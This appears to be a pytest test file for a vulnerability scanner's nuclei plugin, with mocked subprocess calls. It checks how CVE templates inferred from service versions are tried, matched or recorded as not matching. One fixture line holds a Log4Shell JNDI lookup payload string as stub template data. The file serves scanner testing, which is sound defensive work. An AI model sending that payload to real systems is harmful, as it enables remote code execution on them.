"""Tried, not matched (G24): a CVE inferred from a version is tried with nuclei's template
for it; a template that ran without matching is recorded on the finding, never claimed for
a template that needs out-of-band callbacks (it cannot match under `-ni`)."""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest
from conftest import FakePlugin, lab_resolver, lab_scope

from zues_scan.cve import LocalCveSource
from zues_scan.orchestrator import Orchestrator
from zues_scan.plugins import nuclei as nuclei_plugin
from zues_scan.plugins.base import Attempt, ScanResult
from zues_scan.plugins.nuclei import NucleiPlugin
from zues_scan.schema import Asset, Confidence, ScanTarget, Service
from zues_scan.storage import Storage

APACHE = Service(port=8080, name="http", product="Apache httpd", version="2.4.49")
PLAN = ScanTarget("10.0.0.0/24", ("10.0.0.0/24",))


@pytest.fixture
def templates(tmp_path: Path) -> Path:
    root = tmp_path / "templates"
    cves = root / "http" / "cves" / "2021"
    cves.mkdir(parents=True)
    (cves / "CVE-2021-41773.yaml").write_text("id: CVE-2021-41773\nhttp: []\n", encoding="utf-8")
    (cves / "CVE-2021-44228.yaml").write_text(
        "id: CVE-2021-44228\npayload: ${jndi:ldap://{{interactsh-url}}}\n", encoding="utf-8"
    )
    nuclei_plugin._INDEXES.clear()
    return root


def line(
    template: str,
    root: Path,
    *,
    status: bool,
    port: int = 8080,
    extra: dict[str, Any] | None = None,
) -> str:
    path = next(root.rglob(f"{template}.yaml"), root / "gone.yaml")
    record = {
        "template-id": template,
        "template-path": str(path),
        "type": "http",
        "host": "10.0.0.5",
        "port": str(port),
        "ip": "10.0.0.5",
        "url": f"http://10.0.0.5:{port}",
        "matcher-status": status,
        "info": {
            "name": template,
            "severity": "critical",
            "classification": {"cve-id": [template.lower()]},
        },
    }
    return json.dumps(record | (extra or {}))


def fake(monkeypatch: pytest.MonkeyPatch, stdout: str) -> list[list[str]]:
    calls: list[list[str]] = []

    def run(command: list[str], **kwargs: Any) -> object:
        if "-version" in command:
            return subprocess.CompletedProcess(command, 0, "", "Engine Version: v3.11.1")
        calls.append(command)
        return subprocess.CompletedProcess(command, 0, stdout=stdout, stderr="")

    monkeypatch.setattr(shutil, "which", lambda _name: "/usr/bin/nuclei")
    monkeypatch.setattr(subprocess, "run", run)
    return calls


def assets() -> list[Asset]:
    return [Asset("10.0.0.5", "10.0.0.5", [APACHE, Service(22, name="ssh")])]


def test_a_template_that_ran_without_matching_is_recorded(
    monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    calls = fake(monkeypatch, line("CVE-2021-41773", templates, status=False) + "\n")
    wanted = {("10.0.0.5", 8080): {"CVE-2021-41773", "CVE-2021-44228", "CVE-2099-0001"}}
    result = NucleiPlugin(templates=str(templates)).verify(PLAN, assets(), wanted)

    (command,) = calls  # only the web service: no CVE was inferred for SSH
    assert command[command.index("-id") + 1] == "CVE-2021-41773"  # Log4Shell: not even run
    assert command[-1] == "-ms" and "-ni" in command
    (attempt,) = result.tried
    assert (attempt.ip, attempt.port, attempt.cve) == ("10.0.0.5", 8080, "CVE-2021-41773")
    assert attempt.what.startswith("nuclei 3.11.1 (templates ")
    assert "template CVE-2021-41773 ran at http://10.0.0.5:8080 and did not match" in attempt.what
    assert any(
        "need out-of-band callbacks (interactsh, see ZUES_INTERACTSH_SERVER): CVE-2021-44228" in n
        for n in result.notes
    )
    assert any("no template to try: CVE-2099-0001" in n for n in result.notes)
    assert result.assets == []


def test_an_out_of_band_template_is_never_claimed(
    monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    # nuclei's own templates (not pinned): the template file decides after the run.
    fake(monkeypatch, line("CVE-2021-44228", templates, status=False) + "\n")
    wanted = {("10.0.0.5", 8080): {"CVE-2021-44228"}}
    assert NucleiPlugin().verify(PLAN, assets(), wanted).tried == []


def test_a_template_file_that_cannot_be_read_is_not_claimed(
    monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    fake(monkeypatch, line("CVE-2021-41773", templates, status=False, extra={"template-path": "x"}))
    wanted = {("10.0.0.5", 8080): {"CVE-2021-41773"}}
    assert NucleiPlugin().verify(PLAN, assets(), wanted).tried == []


def test_a_match_confirms_instead(monkeypatch: pytest.MonkeyPatch, templates: Path) -> None:
    out = "\n".join(
        [
            line(
                "CVE-2021-41773",
                templates,
                status=True,
                extra={"matched-at": "http://10.0.0.5:8080/cgi-bin/x"},
            ),
            line("CVE-2021-41773", templates, status=False),  # another vhost: no matter
        ]
    )
    fake(monkeypatch, out)
    wanted = {("10.0.0.5", 8080): {"CVE-2021-41773"}}
    result = NucleiPlugin(templates=str(templates)).verify(PLAN, assets(), wanted)
    assert result.tried == []
    (asset,) = result.assets
    (finding,) = asset.findings
    assert finding.confidence is Confidence.CONFIRMED and finding.service is APACHE


def test_a_service_not_asked_about_gets_no_claim(
    monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    fake(monkeypatch, line("CVE-2021-41773", templates, status=False, port=8443))
    wanted = {("10.0.0.5", 8080): {"CVE-2021-41773"}}
    assert NucleiPlugin(templates=str(templates)).verify(PLAN, assets(), wanted).tried == []


# --- in the pipeline ------------------------------------------------------------------------------


class Verifier:
    """A check whose own pass finds nothing and whose verify says what it tried."""

    name = "nuclei"

    def __init__(self, result: ScanResult) -> None:
        self.result = result
        self.asked: list[dict[tuple[str, int], set[str]]] = []

    def is_available(self) -> bool:
        return True

    def version(self) -> str:
        return "3.11.1"

    def check(self, plan: ScanTarget, found: list[Asset]) -> ScanResult:
        return ScanResult()

    def verify(
        self, plan: ScanTarget, found: list[Asset], wanted: dict[tuple[str, int], set[str]]
    ) -> ScanResult:
        self.asked.append(wanted)
        return self.result


def orchestrate(check: Verifier) -> Any:
    scanner = FakePlugin([Asset(host="10.0.0.5", ip="10.0.0.5", services=[APACHE])])
    return Orchestrator(
        [scanner],
        lab_scope("@activity active"),
        cve_source=LocalCveSource(),
        resolver=lab_resolver,
        checks=[check],
    ).run("10.0.0.5")


def test_the_attempt_lands_on_the_finding_and_in_the_database(tmp_path: Path) -> None:
    what = "nuclei 3.11.1: template CVE-2021-41773 ran at http://10.0.0.5:8080 and did not match"
    check = Verifier(ScanResult(tried=[Attempt("10.0.0.5", 8080, "CVE-2021-41773", what)]))
    run = orchestrate(check)
    assert "CVE-2021-41773" in check.asked[0][("10.0.0.5", 8080)]
    (finding,) = [f for f in run.assets[0].findings if f.cve == "CVE-2021-41773"]
    assert finding.tried == what and finding.confidence is not Confidence.CONFIRMED
    others = [f for f in run.assets[0].findings if f.cve != "CVE-2021-41773"]
    assert all(f.tried is None for f in others)

    with Storage(tmp_path / "zues.db") as store:
        loaded = store.load_run(store.save_run(run))
        (row,) = [r for r in store.inventory_findings() if r.cve == "CVE-2021-41773"]
    assert loaded is not None
    assert [f.tried for f in loaded.assets[0].findings if f.cve == "CVE-2021-41773"] == [what]
    assert row.tried == what


def test_the_inventory_keeps_the_last_attempt_until_a_confirmation(tmp_path: Path) -> None:
    what = "nuclei 3.11.1: template CVE-2021-41773 ran at http://10.0.0.5:8080 and did not match"
    tried = orchestrate(
        Verifier(ScanResult(tried=[Attempt("10.0.0.5", 8080, "CVE-2021-41773", what)]))
    )
    untested = orchestrate(Verifier(ScanResult()))
    confirming = Verifier(ScanResult())
    hit = NucleiPlugin.parse_jsonl(
        json.dumps(
            {
                "template-id": "CVE-2021-41773",
                "ip": "10.0.0.5",
                "port": "8080",
                "matched-at": "http://10.0.0.5:8080/cgi-bin/x",
                "info": {
                    "name": "Apache path traversal",
                    "severity": "critical",
                    "classification": {"cve-id": ["cve-2021-41773"]},
                },
            }
        )
    )
    confirming.result = ScanResult(assets=[Asset("10.0.0.5", "10.0.0.5", findings=[hit[0][1]])])
    confirmed = orchestrate(confirming)
    (f,) = [f for f in confirmed.assets[0].findings if f.cve == "CVE-2021-41773"]
    assert f.confidence is Confidence.CONFIRMED and f.tried is None  # the observation won

    def latest() -> Any:
        with Storage(tmp_path / "zues.db") as store:
            return next(r for r in store.inventory_findings() if r.cve == "CVE-2021-41773")

    with Storage(tmp_path / "zues.db") as store:
        store.save_run(tried)
        store.save_run(untested)
    assert latest().tried == what  # a run that did not test it keeps the last attempt
    with Storage(tmp_path / "zues.db") as store:
        store.save_run(confirmed)
    assert latest().tried is None and latest().confidence == "confirmed"


def test_nothing_inferred_nothing_tried() -> None:
    check = Verifier(ScanResult())
    scanner = FakePlugin([Asset(host="10.0.0.5", ip="10.0.0.5", services=[Service(22)])])
    Orchestrator(
        [scanner],
        lab_scope("@activity active"),
        cve_source=LocalCveSource(),
        resolver=lab_resolver,
        checks=[check],
    ).run("10.0.0.5")
    assert check.asked == []
